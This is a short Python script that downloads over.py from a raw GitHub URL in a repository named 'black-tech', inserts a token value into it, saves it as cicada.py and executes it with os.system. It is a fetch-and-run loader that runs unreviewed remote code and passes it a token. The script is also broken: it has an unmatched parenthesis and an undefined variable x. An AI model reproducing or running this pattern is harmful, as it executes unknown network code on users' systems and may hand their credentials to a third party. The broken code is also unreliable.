from urllib.request import urlopen
import os

url = 'https://raw.githubusercontent.com/cicadoves/black-tech/main/over.py'
path = 'cicada.py'
code = urlopen(url).read().decode())
open(path, 'w').write(code.replace('<token>', x))
os.system('python '+path)
